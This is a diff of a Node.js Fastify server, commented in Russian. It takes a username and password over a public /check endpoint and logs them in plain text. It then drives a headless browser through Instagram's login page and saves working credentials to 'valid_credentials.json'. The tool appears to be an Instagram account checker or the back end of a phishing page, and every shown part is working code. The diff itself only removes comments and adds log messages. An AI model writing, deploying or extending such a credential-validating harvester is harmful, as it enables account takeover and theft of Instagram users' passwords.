@@ -9,7 +9,6 @@ const DATA_FILE = "valid_credentials.json";
 const app = Fastify();
 app.register(cors);
 
-// Функция валидации логина и пароля
 function validateCredentials(username, password) {
     if (!username || !password) {
         return { valid: false, message: "Логин и пароль обязательны!" };
@@ -27,7 +26,6 @@ function validateCredentials(username, password) {
     return { valid: true };
 }
 
-// Функция сохранения успешных логинов
 function saveCredentials(username, password) {
     let credentials = [];
     if (fs.existsSync(DATA_FILE)) {
@@ -37,7 +35,6 @@ function saveCredentials(username, password) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
 }
 
-// Обработчик POST-запроса на /check
 app.post("/check", async (request, reply) => {
     console.log("Новый POST-запрос на /check", request.body);
 
@@ -54,16 +51,18 @@ app.post("/check", async (request, reply) => {
     const page = await browser.newPage();
 
     try {
-        console.log("Загружаем страницу авторизации...");
         await page.goto("https://www.instagram.com/accounts/login/");
         console.log("Загружена страница авторизации...");
 
         await page.waitForSelector("input[name='username']", { timeout: 5000 });
+        console.log("Элементы формы авторизации найдены");
+
         await page.fill("input[name='username']", username);
         await page.fill("input[name='password']", password);
         await page.click("button[type='submit']");
-        
-        // Ожидание загрузки после нажатия
+        console.log("Кнопка 'Войти' нажата");
+
+        // Ожидание 5 секунд для выполнения редиректа или ошибки
         await page.waitForTimeout(5000);
 
         let loginSuccess = false;
@@ -102,13 +101,11 @@ app.post("/check", async (request, reply) => {
     }
 });
 
-// Обработчик GET-запроса на /
 app.get("/", async (request, reply) => {
     console.log("Новый GET-запрос на /");
     reply.send("Сервер работает!");
 });
 
-// Запуск сервера на 0.0.0.0 (важно для Render)
 app.listen({ port: PORT, host: '0.0.0.0' }, (err, address) => {
     if (err) {
         console.error("Ошибка запуска сервера:", err);
